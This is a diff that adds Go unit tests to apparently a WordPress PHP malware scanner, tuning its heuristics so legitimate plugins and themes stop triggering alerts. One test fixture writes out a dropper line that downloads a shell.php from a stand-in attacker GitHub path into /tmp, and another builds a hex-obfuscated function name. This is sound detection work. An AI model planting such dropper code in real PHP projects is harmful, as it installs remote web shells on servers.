@@ -450,3 +450,128 @@ func TestIsSafePHPInWPDir_WPMLQueue(t *testing.T) {
 		}
 	}
 }
+
+// --- analyzePHPContent: github raw URL co-presence is too weak alone -----
+//
+// Legitimate WordPress plugins (wp-statistics, unyson, polylang, etc.)
+// fetch upstream resources from raw.githubusercontent.com and write them
+// with file_put_contents/fwrite. The tokens co-exist in the same 32 KB
+// window but never on the same line. Treating that pattern as a stand-
+// alone indicator generates one suspicious_php_content per legit plugin
+// install and per scan cycle. Same-line github+dangerous-call is still
+// strong (and is preserved); co-presence across distant lines is dropped.
+
+func TestAnalyzePHPContentGithubCopresenceDoesNotFire_WPStatistics(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "class-wp-statistics-updates.php")
+	// Shape mirrors wp-statistics/.../class-wp-statistics-updates.php on disk:
+	// raw.githubusercontent.com URL declared on line 14 inside an array,
+	// fwrite() called on line 167 inside download_geoip(). No other
+	// indicators in the file.
+	content := "<?php\nclass WP_Statistics_Updates {\n" +
+		"    public static $geoip = array(\n" +
+		"        'country' => array(\n" +
+		"            'github' => 'https://raw.githubusercontent.com/wp-statistics/GeoLite2-Country/master/GeoLite2-Country.mmdb.gz',\n" +
+		"            'file' => 'GeoLite2-Country',\n" +
+		"        ),\n" +
+		"    );\n" +
+		"    static function download_geoip($pack) {\n" +
+		"        $DBfh = fopen('/tmp/db.mmdb', 'wb');\n" +
+		"        $data = wp_remote_get($pack);\n" +
+		"        fwrite($DBfh, $data);\n" +
+		"        fclose($DBfh);\n" +
+		"    }\n" +
+		"}\n"
+	_ = os.WriteFile(path, []byte(content), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check != "" {
+		t.Errorf("github raw URL + fwrite() on different lines (legit wp-statistics) must not fire; got check=%q details=%q", result.check, result.details)
+	}
+}
+
+func TestAnalyzePHPContentGithubCopresenceDoesNotFire_Unyson(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "load-latest-fonts.php")
+	// Shape mirrors unyson/framework/bin/load-latest-fonts.php: CLI
+	// guard, file_put_contents() on one line, raw.github URL elsewhere.
+	content := "#!/usr/bin/env php\n<?php\n" +
+		"if (php_sapi_name() != 'cli') { die(); }\n" +
+		"function dl($url, $file_path) {\n" +
+		"    $data = curl_get($url);\n" +
+		"    file_put_contents($file_path, $data);\n" +
+		"}\n" +
+		"function github_url($repo, $path) {\n" +
+		"    return 'https://raw.githubusercontent.com/' . $repo . '/master/' . $path;\n" +
+		"}\n"
+	_ = os.WriteFile(path, []byte(content), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check != "" {
+		t.Errorf("github raw URL + file_put_contents on different lines (legit unyson) must not fire; got check=%q details=%q", result.check, result.details)
+	}
+}
+
+func TestAnalyzePHPContentGithubSameLineStillFires(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "dropper.php")
+	// Same-line raw.github + file_put_contents is the strong-signal
+	// dropper pattern. Must keep firing as a suspicious_php_content
+	// (one indicator => HIGH) even after co-presence is dropped.
+	content := "<?php\nfile_put_contents('/tmp/payload.php', file_get_contents('https://raw.githubusercontent.com/attacker/payloads/master/shell.php'));\n"
+	_ = os.WriteFile(path, []byte(content), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check == "" {
+		t.Fatal("same-line github raw + file_put_contents must still fire")
+	}
+}
+
+// --- analyzePHPContent: dotConcat>30 alone is a theme/template pattern --
+//
+// WordPress themes and page builders construct dynamic CSS and HTML by
+// concatenating literal style tokens with PHP expressions. The Sydney
+// theme's inc/styles.php produces 71 occurrences of `" . "` purely from
+// CSS concatenation; dozens of other themes do the same. The hex+concat
+// combined branch (>20 hex AND >10 concat) already catches obfuscated
+// function-name builders. The standalone "concat>30" branch catches the
+// CSS pattern almost exclusively.
+
+func TestAnalyzePHPContentThemeCSSDoesNotFire_Sydney(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "styles.php")
+	// 70+ CSS concatenations with no hex strings - exact shape of
+	// themes/sydney/inc/styles.php on disk.
+	var b strings.Builder
+	b.WriteString("<?php\nclass Sydney_Custom_CSS {\n    public function output_css() {\n        $custom = '';\n")
+	for i := 0; i < 40; i++ {
+		b.WriteString("        $custom .= \".header-image { background-image:url(\" . esc_url($shop_thumb) . \")!important;display:block;}\" . \"\\n\";\n")
+	}
+	b.WriteString("        return $custom;\n    }\n}\n")
+	_ = os.WriteFile(path, []byte(b.String()), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check != "" {
+		t.Errorf("theme dynamic-CSS builder (concat>30, no hex) must not fire; got check=%q details=%q", result.check, result.details)
+	}
+}
+
+func TestAnalyzePHPContentHexPlusConcatStillFires(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "obf.php")
+	// Real obfuscation: hex-built function names with heavy concatenation
+	// (>20 hex strings AND >10 concat). The combined-signal branch must
+	// keep firing.
+	var b strings.Builder
+	b.WriteString("<?php\n$f = ")
+	for i := 0; i < 15; i++ {
+		b.WriteString("\"\\x63\" . \"\\x75\" . \"\\x72\" . \"\\x6c\" . ")
+	}
+	b.WriteString("\"\";\n")
+	_ = os.WriteFile(path, []byte(b.String()), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check == "" {
+		t.Fatal("hex>20 + concat>10 obfuscation must still fire")
+	}
+}
